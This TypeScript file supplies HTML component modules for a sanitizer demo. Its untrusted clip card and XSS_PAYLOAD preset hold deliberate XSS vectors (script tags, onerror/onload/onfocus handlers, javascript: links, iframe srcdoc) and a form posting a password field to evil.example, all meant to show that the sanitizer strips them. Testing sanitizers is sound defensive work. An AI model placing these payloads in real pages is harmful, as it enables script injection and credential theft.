/**
 * The HTML modules of the Workbench room, as source strings.
 *
 * In the standalone app (github.com/johnhenry/workbench) these are real `.html` files served from /components/.
 * Here the room serves the same kind of source from a stub `fetch`, so html-modules' loader still fetches, parses,
 * resolves `<html-import src="@workbench/ui/kit.html">` through the import map mport generated, and defines custom
 * elements. They read the `--wa-*` theme tokens window-algebra defines, which the room maps onto Circuit's.
 */

const BTN_BASE = `
      font: inherit; font-size: 13px; line-height: 1.2; cursor: pointer;
      padding: 6px 12px; border-radius: var(--wa-radius-sm, 4px);
      border: var(--wa-border-width, 1px) solid var(--wa-color-border);
      background: var(--wa-color-surface-raised); color: var(--wa-color-fg);`;

const KIT = `<!-- The shared component module. Every tool module imports this one: modules importing modules. -->

<html-export name="button" delegates-focus props="variant label pressed">
  <style>
    :host { display: inline-block; }
    .btn {${BTN_BASE}
    }
    .btn:hover { background: var(--wa-color-accent-soft); }
    .btn:focus-visible { outline: var(--wa-focus-ring-width, 3px) solid var(--wa-focus-ring-color); outline-offset: var(--wa-focus-ring-offset, 2px); }
    .btn[aria-pressed="true"] { border-color: var(--wa-color-accent); background: var(--wa-color-accent-soft); font-weight: 600; }
    :host([variant="icon"]) .btn { padding: 2px 8px; font-size: 12px; }
    :host([variant="danger"]) .btn { color: var(--wa-color-danger); }
  </style>
  <template>
    <button part="button" class="btn" type="button" aria-label="{{label}}" aria-pressed="{{pressed}}"><slot></slot></button>
  </template>
</html-export>

<!-- A real submit button: form-associated with form-role="submit". Click, Enter and Space submit the form; it is the
     form's default button and the submit event's submitter. -->
<html-export name="submit-button" form-associated form-role="submit" delegates-focus props="variant">
  <style>
    :host { display: inline-block; }
    .btn {${BTN_BASE}
    }
    .btn:hover { filter: brightness(1.08); }
    .btn:focus-visible { outline: var(--wa-focus-ring-width, 3px) solid var(--wa-focus-ring-color); outline-offset: var(--wa-focus-ring-offset, 2px); }
    :host([variant="primary"]) .btn { background: var(--wa-color-accent); color: var(--wa-color-accent-fg); border-color: transparent; font-weight: 600; }
  </style>
  <template><button part="button" class="btn" type="button"><slot></slot></button></template>
</html-export>

<!-- Form-associated: a real form control. It takes part in FormData, :invalid, reset and required. -->
<html-export name="field" form-associated form-control="input" props="placeholder">
  <style>
    :host { display: block; }
    label { display: grid; gap: 4px; font-size: 12px; color: var(--wa-color-fg-muted); }
    input {
      font: inherit; font-size: 14px; padding: 7px 9px; box-sizing: border-box; width: 100%;
      border-radius: var(--wa-radius-sm, 4px); border: var(--wa-border-width, 1px) solid var(--wa-color-border);
      background: var(--wa-color-bg); color: var(--wa-color-fg);
    }
    input:focus-visible { outline: var(--wa-focus-ring-width, 3px) solid var(--wa-focus-ring-color); outline-offset: 1px; }
    :host(:user-invalid) input { border-color: var(--wa-color-danger); }
  </style>
  <template><label><span><slot></slot></span><input autocomplete="off" placeholder="{{placeholder}}"></label></template>
</html-export>

<html-export name="area" form-associated form-control="textarea" props="placeholder">
  <style>
    :host { display: block; }
    label { display: grid; gap: 4px; font-size: 12px; color: var(--wa-color-fg-muted); }
    textarea {
      font: inherit; font-family: var(--f-mono, ui-monospace, monospace); font-size: 12.5px; padding: 7px 9px; box-sizing: border-box; width: 100%;
      min-height: 4.5rem; resize: vertical;
      border-radius: var(--wa-radius-sm, 4px); border: var(--wa-border-width, 1px) solid var(--wa-color-border);
      background: var(--wa-color-bg); color: var(--wa-color-fg);
    }
    textarea:focus-visible { outline: var(--wa-focus-ring-width, 3px) solid var(--wa-focus-ring-color); outline-offset: 1px; }
  </style>
  <template><label><span><slot></slot></span><textarea placeholder="{{placeholder}}"></textarea></label></template>
</html-export>

<html-export name="badge" props="tone">
  <style>
    :host { display: inline-block; }
    span {
      font-size: 11px; font-weight: 600; padding: 1px 8px; border-radius: var(--wa-radius-pill, 999px);
      background: var(--wa-color-accent-soft); color: var(--wa-color-fg);
      border: var(--wa-border-width, 1px) solid var(--wa-color-border);
    }
    span[data-tone="danger"] { color: var(--wa-color-danger); border-color: currentColor; background: transparent; }
    span[data-tone="ok"] { color: var(--wb-ok, #3fb68b); border-color: currentColor; background: transparent; }
  </style>
  <template><span data-tone="{{tone}}"><slot></slot></span></template>
</html-export>

<!-- Data binding: {{attr}} reads the host's attribute; props="value:number" makes it a typed property. -->
<html-export name="stat" props="label value:number tone">
  <style>
    :host { display: block; }
    div { display: grid; gap: 2px; padding: 6px 10px; border: var(--wa-border-width, 1px) solid var(--wa-color-border); border-radius: var(--wa-radius-md, 8px); background: var(--wa-color-bg); }
    .value { font-size: 22px; font-weight: 700; font-variant-numeric: tabular-nums; }
    .label { font-size: 11px; color: var(--wa-color-fg-muted); }
    div[data-tone="ok"] .value { color: var(--wb-ok, #3fb68b); }
    div[data-tone="danger"] .value { color: var(--wa-color-danger); }
  </style>
  <template><div data-tone="{{tone}}"><span class="value">{{value}}</span><span class="label">{{label}}</span></div></template>
</html-export>

<html-export name="removal" props="name detail">
  <style>
    :host { display: block; }
    div { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 8px; align-items: baseline; font-size: 12px; padding: 3px 0; border-bottom: var(--wa-border-width, 1px) solid var(--wa-color-border); }
    .name { font-family: var(--f-mono, monospace); overflow-wrap: anywhere; color: var(--wa-color-danger); }
    .detail { color: var(--wa-color-fg-muted); text-align: end; overflow-wrap: anywhere; }
  </style>
  <template><div><span class="name">{{name}}</span><span class="detail">{{detail}}</span></div></template>
</html-export>
`;

const NOTES = `<!-- Notes: a form (two form-associated fields and a submit-button component) and a list of note cards.
     It imports the shared kit through the import map: a bare specifier, "@workbench/ui/", that mport generated. -->
<html-import src="@workbench/ui/kit.html" as="kit"></html-import>

<html-export name="notes-tool" props="count:number">
  <style>
    :host { display: block; padding: var(--wa-space-md, 12px); font-family: var(--f-body, system-ui); color: var(--wa-color-fg); }
    form { display: grid; gap: 8px; }
    .row { display: flex; align-items: center; justify-content: space-between; gap: 8px; }
    .count { font-size: 12px; color: var(--wa-color-fg-muted); }
    .items { display: grid; gap: 8px; margin-top: 14px; }
    .empty { margin: 0; color: var(--wa-color-fg-muted); font-size: 13px; }
  </style>
  <template>
    <form part="form" aria-label="New note">
      <kit--field name="title" required placeholder="What is it about?">Title</kit--field>
      <kit--area name="body" placeholder="Paste HTML or plain text. It is untrusted.">Note body (untrusted)</kit--area>
      <div class="row">
        <kit--submit-button variant="primary">Add note</kit--submit-button>
        <span class="count" role="status">{{count}} saved</span>
      </div>
    </form>
    <section class="items" aria-label="Saved notes"><slot name="items"><p class="empty">No notes yet.</p></slot></section>
  </template>
</html-export>

<html-export name="note-card" props="heading profile updated report selected">
  <style>
    :host { display: block; }
    article { padding: 8px 10px; border: var(--wa-border-width, 1px) solid var(--wa-color-border); border-radius: var(--wa-radius-md, 8px); background: var(--wa-color-bg); }
    :host([selected]) article { border-color: var(--wa-color-accent); box-shadow: 0 0 0 1px var(--wa-color-accent); }
    header { display: flex; align-items: start; justify-content: space-between; gap: 8px; }
    h3 { margin: 0; font-size: 14px; overflow-wrap: anywhere; }
    .tools { display: flex; gap: 4px; align-items: center; flex-shrink: 0; }
    .body { margin: 6px 0 0; overflow-wrap: anywhere; font-size: 13.5px; }
    .body safe-fragment { display: block; }
    .body safe-fragment[profile="plain-text-v1"] { white-space: pre-wrap; }
    .body :is(p, ul, ol, blockquote, h1, h2, h3, h4, pre, table) { margin: 6px 0 0; }
    .body :is(h1, h2, h3, h4) { font-size: 14px; }
    .body img { max-width: 100%; height: auto; }
    .body a { color: var(--wa-color-accent); }
    .report:empty { display: none; }
    .report { margin: 6px 0 0; font-size: 11.5px; color: var(--wa-color-fg-muted); overflow-wrap: anywhere; font-family: var(--f-mono, monospace); }
    .meta { margin: 4px 0 0; font-size: 11px; color: var(--wa-color-fg-muted); }
  </style>
  <template>
    <article>
      <header>
        <h3>{{heading}}</h3>
        <span class="tools">
          <kit--badge>{{profile}}</kit--badge>
          <kit--button variant="icon" data-action="inspect" label="Inspect the sanitizer report for {{heading}}">Report</kit--button>
          <kit--button variant="icon" data-action="delete" label="Delete note {{heading}}">Delete</kit--button>
        </span>
      </header>
      <!-- The note's body is untrusted rich text. It is never written into this template: the tool's glue hands the
           string to <safe-fragment> as a property, which renders it through the profile; the report comes back as an event. -->
      <div class="body"><safe-fragment profile="article-v1" render-mode="replace"></safe-fragment></div>
      <p class="report" data-report>{{report}}</p>
      <p class="meta">{{updated}}</p>
    </article>
  </template>
</html-export>
`;

const CLIPS = `<!-- Clips: a tool whose card comes from a module the desk does not fully trust (untrusted/clip.html).
     The glue loads that module through html-modules' sanitize hook and lists what the sanitizer removed. -->
<html-import src="@workbench/ui/kit.html" as="kit"></html-import>

<html-export name="clips-tool" props="removed:number">
  <style>
    :host { display: block; padding: var(--wa-space-md, 12px); font-family: var(--f-body, system-ui); color: var(--wa-color-fg); }
    h3 { margin: 14px 0 6px; font-size: 13px; }
    p { margin: 0; font-size: 13px; color: var(--wa-color-fg-muted); }
    code { font-family: var(--f-mono, monospace); color: var(--wa-color-accent); font-size: 12px; }
    .stage { margin-top: 8px; }
    .rows { display: grid; gap: 2px; }
    .empty { margin: 0; font-size: 12px; color: var(--wa-color-fg-muted); }
  </style>
  <template>
    <p>This card is defined by a module from a less-trusted origin. Its template was sanitized by safe-fragment
       (<code>safeFragmentSanitizer</code>) <em>before</em> the component existed.</p>
    <section class="stage" aria-label="The less-trusted card"><slot name="card"><p class="empty">Loading the module…</p></slot></section>
    <h3 id="removed-heading">Removed by the sanitizer: <kit--badge tone="danger">{{removed}}</kit--badge></h3>
    <section class="rows" aria-labelledby="removed-heading"><slot name="removed"><p class="empty">Nothing removed yet.</p></slot></section>
  </template>
</html-export>
`;

const CLIP = `<!-- A module from a less-trusted origin: a clip card that somebody else wrote. It is loaded through html-modules'
     sanitize hook, so the template below is cleaned before the component is defined. The hostile bits are the point:
     every one of them must be gone from the rendered card, and the good parts (the heading binding, the https link,
     the formatting) must stay. -->
<html-export name="card" props="heading">
  <!-- Stylesheets are NOT sanitized (safe-fragment cannot carry <style>): this one is the desk's own. -->
  <style>
    :host { display: block; }
    article { padding: 8px 10px; border: var(--wa-border-width, 1px) dashed var(--wa-color-border); border-radius: var(--wa-radius-md, 8px); font-size: 13px; color: var(--wa-color-fg); }
    h3 { margin: 0 0 6px; font-size: 14px; border-bottom: 1px dashed currentColor; }
    p { margin: 6px 0 0; }
    a { color: var(--wa-color-accent); }
    img { max-width: 2rem; height: auto; vertical-align: middle; }
  </style>
  <template>
    <article>
      <h3>{{heading}}</h3>
      <p>Hello from a module you do not fully trust. It has <strong>bold</strong>, <em>italic</em> and
         <a href="https://opensource.johnhenry.me/html-modules/" target="_blank">a link</a>.</p>
      <p><img src="https://johnhenry.github.io/workbench/favicon.svg" alt="the workbench icon" onerror="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('clip: img onerror')">
         <a href="javascript:window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('clip: javascript: href')">a javascript: link</a></p>
      <script>window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('clip: script')</script>
      <iframe srcdoc="<script>parent.__orreryWorkbenchPwned = (parent.__orreryWorkbenchPwned || []).concat('clip: iframe srcdoc')</script>"></iframe>
      <svg onload="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('clip: svg onload')" width="10" height="10"><circle r="4"/></svg>
      <form action="javascript:window.__orreryWorkbenchPwned = 1"><input name="x" onfocus="window.__orreryWorkbenchPwned = 2" autofocus></form>
      <p onclick="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('clip: onclick')">Clickable text.</p>
    </article>
  </template>
</html-export>
`;

const REPORT = `<!-- The sanitizer report for one note: data-bound stats (props="x:number" + {{x}} passed down to kit--stat),
     the removed elements and attributes, the raw input and the rendered DOM side by side. -->
<html-import src="@workbench/ui/kit.html" as="kit"></html-import>

<html-export name="report-tool" props="heading profile engine els:number attrs:number urls:number executed:number ms">
  <style>
    :host { display: block; padding: var(--wa-space-md, 12px); font-family: var(--f-body, system-ui); color: var(--wa-color-fg); }
    header { display: flex; flex-wrap: wrap; align-items: center; gap: 6px 8px; }
    h3 { margin: 0; font-size: 14px; flex: 1 1 auto; overflow-wrap: anywhere; }
    h4 { margin: 14px 0 6px; font-size: 12px; text-transform: uppercase; letter-spacing: .06em; color: var(--wa-color-fg-muted); }
    .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(110px, 1fr)); gap: 8px; margin-top: 10px; }
    .rows { display: grid; gap: 2px; }
    .empty { margin: 0; font-size: 12px; color: var(--wa-color-fg-muted); }
    ::slotted(pre) {
      margin: 0; padding: 8px 10px; max-height: 150px; overflow: auto; white-space: pre-wrap; overflow-wrap: anywhere;
      font: 11.5px/1.5 var(--f-mono, monospace); background: var(--wa-color-bg); color: var(--wa-color-fg);
      border: var(--wa-border-width, 1px) solid var(--wa-color-border); border-radius: var(--wa-radius-sm, 4px);
    }
    .ctl { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; margin-top: 14px; }
    ::slotted([slot="control"]) { font-size: 12px; color: var(--wa-color-fg-muted); }
  </style>
  <template>
    <header>
      <h3>{{heading}}</h3>
      <kit--badge>{{profile}}</kit--badge>
      <kit--badge>engine: {{engine}}</kit--badge>
      <kit--badge>{{ms}} ms</kit--badge>
    </header>
    <section class="stats" aria-label="Report totals">
      <kit--stat label="elements removed" value="{{els}}"></kit--stat>
      <kit--stat label="attributes removed" value="{{attrs}}"></kit--stat>
      <kit--stat label="URLs rewritten" value="{{urls}}"></kit--stat>
      <kit--stat label="handlers that ran" value="{{executed}}" tone="ok"></kit--stat>
    </section>
    <h4>Listed in the report</h4>
    <section class="rows" aria-label="Removed by the sanitizer"><slot name="removed"><p class="empty">Nothing listed for this note.</p></slot></section>
    <h4>Independent check: hazards in the input, then in the live DOM</h4>
    <section class="rows" aria-label="Hazards before and after"><slot name="audit"><p class="empty">No hazards in this note's input.</p></slot></section>
    <h4>What was pasted (raw)</h4>
    <slot name="raw"></slot>
    <h4>What is in the DOM (serialised from the live render)</h4>
    <slot name="rendered"></slot>
    <div class="ctl">
      <kit--button data-action="control">Control: run the raw note with no sanitizer</kit--button>
      <slot name="control"></slot>
    </div>
  </template>
</html-export>
`;

/** Virtual files of the desk's component library, keyed by path under /workbench/components/. */
export const FILES: Record<string, string> = {
  'kit.html': KIT,
  'notes.html': NOTES,
  'clips.html': CLIPS,
  'untrusted/clip.html': CLIP,
  'report.html': REPORT,
};

/** The hostile note the "paste an XSS payload" preset submits. Nothing in it is ever executed by the room. */
export const XSS_TITLE = 'Pasted from a "helpful" web page';
export const XSS_PAYLOAD = `<h3>Q3 planning notes</h3>
<p>Looks harmless: <strong>bold</strong>, <em>italic</em> and <a href="https://opensource.johnhenry.me/safe-fragment/">a real link</a>.</p>
<img src="x" onerror="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('img onerror')">
<script>window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('script')</script>
<p><a href="javascript:window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('javascript: href')">click for the quarterly numbers</a>
   and <a href="  JaVa&#x09;ScRiPt:alert(1)">an obfuscated one</a></p>
<svg onload="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('svg onload')" width="10" height="10"><circle r="4"/></svg>
<iframe srcdoc="<script>parent.__orreryWorkbenchPwned = (parent.__orreryWorkbenchPwned || []).concat('iframe srcdoc')</script>"></iframe>
<form action="https://evil.example/steal"><input name="pw" autofocus onfocus="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('onfocus')"><button formaction="https://evil.example/steal">Send</button></form>
<p style="position:fixed;inset:0;background:red" onclick="window.__orreryWorkbenchPwned = (window.__orreryWorkbenchPwned || []).concat('onclick')">A full-page overlay, if style survived.</p>`;
